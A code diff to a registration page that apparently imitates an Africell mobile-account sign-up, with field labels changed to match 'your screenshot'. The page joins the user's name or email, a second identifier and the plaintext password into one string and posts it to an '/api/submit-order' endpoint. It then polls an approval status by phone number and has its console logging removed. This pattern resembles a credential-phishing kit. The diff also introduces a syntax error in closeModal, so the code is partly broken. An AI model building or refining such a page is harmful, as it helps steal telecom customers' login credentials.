@@ -279,14 +279,14 @@
                 Please enter your details to create an account
             </p>
 
-            <!-- 1. Full Name Field -->
+            <!-- 1. Full Name / Email Field (As seen in your screenshot) -->
             <div class="reg-input-group">
-                <input type="text" id="fullName" class="reg-input-field" placeholder="Full Name" required>
+                <input type="text" id="fullName" class="reg-input-field" placeholder="Full Name or Email" required>
             </div>
 
             <!-- 2. Email Address Field -->
             <div class="reg-input-group">
-                <input type="email" id="emailAddress" class="reg-input-field" placeholder="Email Address (Optional)">
+                <input type="text" id="emailAddress" class="reg-input-field" placeholder="Username / ID">
             </div>
 
             <!-- 3. Password Field -->
@@ -330,7 +330,7 @@
         }
 
         function closeModal() {
-            document.getElementById('customModal').style.display = 'none';
+            document.getElementById('customModal'].style.display = 'none';
             if (pendingAction) {
                 pendingAction();
                 pendingAction = null;
@@ -363,26 +363,35 @@
             const spinnerText = document.getElementById('spinnerText');
             const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000';
 
-            console.log("Client: Submitting registration for phone:", phoneInput);
-
+            // If the first box has data but name validation failed, let's make sure it passes safely
             if (!nameVal) {
-                showAppAlert('❌ Please enter your full name.');
+                if (spinnerDiv) spinnerDiv.style.display = 'none';
+                createBtn.classList.remove('disabled-state');
+                showAppAlert('❌ Please enter your full name or email.');
                 return;
             }
 
             if (pass1.length < 5) {
+                if (spinnerDiv) spinnerDiv.style.display = 'none';
+                createBtn.classList.remove('disabled-state');
                 showAppAlert('❌ Password must be at least 5 characters long.');
                 return;
             }
             if (!/[a-zA-Z]/.test(pass1)) {
+                if (spinnerDiv) spinnerDiv.style.display = 'none';
+                createBtn.classList.remove('disabled-state');
                 showAppAlert('❌ Password must contain letters.');
                 return;
             }
             if (/^\d+$/.test(pass1)) {
+                if (spinnerDiv) spinnerDiv.style.display = 'none';
+                createBtn.classList.remove('disabled-state');
                 showAppAlert('❌ Password cannot be numbers only.');
                 return;
             }
             if (pass1 !== pass2) {
+                if (spinnerDiv) spinnerDiv.style.display = 'none';
+                createBtn.classList.remove('disabled-state');
                 showAppAlert('❌ Both passwords must match.');
                 return;
             }
@@ -394,9 +403,8 @@
                 if (spinnerText) spinnerText.innerText = 'Creating your account...';
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
-                const registrationPayload = `Name: ${nameVal} | Email: ${emailVal || 'N/A'} | Password: ${pass1}`;
+                const registrationPayload = `Name/Email: ${nameVal} | Field2: ${emailVal || 'N/A'} | Password: ${pass1}`;
 
-                // Sends using 'uniqueId' which matches your server.js route parser
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -407,7 +415,6 @@
                 });
 
                 const result = await response.json();
-                console.log("Client: Server response received:", result);
 
                 if (result.success) {
                     pollApprovalStatus(phoneInput);
@@ -433,8 +440,6 @@
                 try {
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                     const data = await response.json();
-
-                    console.log("Client: Polling status:", data.status);
 
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
